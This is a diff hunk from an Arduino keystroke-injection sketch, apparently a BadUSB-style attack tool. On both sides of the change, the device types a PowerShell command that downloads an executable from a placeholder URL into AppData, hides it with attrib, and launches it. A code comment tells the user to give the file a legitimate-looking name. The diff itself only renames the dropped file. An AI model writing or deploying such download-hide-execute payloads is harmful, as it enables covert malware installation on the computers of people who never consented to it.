@@ -35,7 +35,7 @@ void loop() {
       Keyboard.write(KEY_RETURN);
       delay(100);
       //download your file and rename it to a legit name, hide the file, launch it and exit console (your .exe needs to be console independant)
-      Keyboard.print("powershell -command \"$clnt = new-object System.Net.WebClient; $clnt.DownloadFile('http://url.com/your/script.exe', '%AppData%/WindowsApp/hostManager.exe');\" & attrib +h %AppData%/WindowsApp/hostManager.exe & %AppData%/WindowsApp/hostManager.exe & exit");
+      Keyboard.print("powershell -command \"$clnt = new-object System.Net.WebClient; $clnt.DownloadFile('http://url.com/your/script.exe', '%AppData%/WindowsApp/ChangeThisName.exe');\" & attrib +h %AppData%/WindowsApp/ChangeThisName.exe & %AppData%/WindowsApp/ChangeThisName.exe & exit");
       delay(100);
       Keyboard.write(KEY_RETURN);
       break;
